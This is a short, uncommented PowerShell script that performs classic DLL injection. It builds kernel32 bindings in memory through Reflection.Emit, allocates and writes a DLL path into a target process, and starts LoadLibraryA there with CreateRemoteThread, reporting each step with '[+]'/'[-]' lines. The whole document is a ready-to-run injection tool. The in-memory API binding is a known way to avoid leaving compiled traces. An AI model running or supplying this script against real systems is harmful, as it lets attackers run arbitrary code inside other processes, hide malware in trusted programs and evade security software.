param(
    [int]   $ProcId,
    [string]$Dll
)
if (-not $ProcId -or -not $Dll) { Write-Error "usage: -ProcId <pid> -Dll <path>"; exit 2 }
if (-not (Test-Path $Dll))      { Write-Error "dll not found: $Dll";       exit 2 }
$Dll = (Resolve-Path $Dll).Path

$asm = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly(
    [System.Reflection.AssemblyName]::new('DynInj'),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$mod = $asm.DefineDynamicModule('m')
$tb  = $mod.DefineType('N', 'Public, Class')

function Add-PInvoke($tb, $name, $ret, $params) {
    $mb = $tb.DefinePInvokeMethod(
        $name, 'kernel32.dll', $name,
        [System.Reflection.MethodAttributes]'Public, Static, PinvokeImpl',
        [System.Reflection.CallingConventions]::Standard,
        $ret, $params,
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $mb.SetImplementationFlags($mb.GetMethodImplementationFlags() -bor 'PreserveSig')
}

Add-PInvoke $tb 'OpenProcess'         ([IntPtr])  ([uint32],[bool],[int])
Add-PInvoke $tb 'VirtualAllocEx'      ([IntPtr])  ([IntPtr],[IntPtr],[uint32],[uint32],[uint32])
Add-PInvoke $tb 'WriteProcessMemory'  ([bool])    ([IntPtr],[IntPtr],[byte[]],[uint32],[UIntPtr].MakeByRefType())
Add-PInvoke $tb 'GetModuleHandleA'    ([IntPtr])  ([string])
Add-PInvoke $tb 'GetProcAddress'      ([IntPtr])  ([IntPtr],[string])
Add-PInvoke $tb 'CreateRemoteThread'  ([IntPtr])  ([IntPtr],[IntPtr],[uint32],[IntPtr],[IntPtr],[uint32],[uint32].MakeByRefType())
Add-PInvoke $tb 'WaitForSingleObject' ([uint32])  ([IntPtr],[uint32])
Add-PInvoke $tb 'GetExitCodeThread'   ([bool])    ([IntPtr],[uint32].MakeByRefType())
Add-PInvoke $tb 'CloseHandle'         ([bool])    ([IntPtr])

$N = $tb.CreateType()

function Err() { [Runtime.InteropServices.Marshal]::GetLastWin32Error() }

$hProc = $N::OpenProcess(0x1F0FFF, $false, $ProcId)
if ($hProc -eq [IntPtr]::Zero) { Write-Host "OpenProcess: err=$(Err)"; exit 1 }
Write-Host "OpenProcess OK hProc=$hProc"

$path = [Text.Encoding]::ASCII.GetBytes($Dll + "`0")
$remote = $N::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$path.Length, 0x3000, 0x04)
if ($remote -eq [IntPtr]::Zero) { Write-Host "VirtualAllocEx: err=$(Err)"; exit 1 }
Write-Host "VirtualAllocEx OK remote=$remote len=$($path.Length)"

$wr = [UIntPtr]::Zero
if (-not $N::WriteProcessMemory($hProc, $remote, $path, [uint32]$path.Length, [ref]$wr)) {
    Write-Host "WriteProcessMemory: err=$(Err)"; exit 1
}
Write-Host "WriteProcessMemory OK wrote=$wr"

$k32 = $N::GetModuleHandleA('kernel32.dll')
$llA = $N::GetProcAddress($k32, 'LoadLibraryA')
Write-Host "LoadLibraryA addr=$llA"

$tid = [uint32]0
$hT  = $N::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $llA, $remote, 0, [ref]$tid)
if ($hT -eq [IntPtr]::Zero) { Write-Host "CreateRemoteThread: err=$(Err)"; exit 1 }
Write-Host "CreateRemoteThread OK tid=$tid hT=$hT"

$rc = $N::WaitForSingleObject($hT, 15000)
Write-Host "WaitForSingleObject rc=$rc"
$exit = [uint32]0
[void]$N::GetExitCodeThread($hT, [ref]$exit)
[void]$N::CloseHandle($hT)
[void]$N::CloseHandle($hProc)

if ($exit -ne 0) {
    Write-Host "[+] LoadLibraryA in target returned low32=0x$($exit.ToString('x'))"
    exit 0
} else {
    Write-Host "[-] LoadLibraryA in target returned NULL"
    exit 1
}
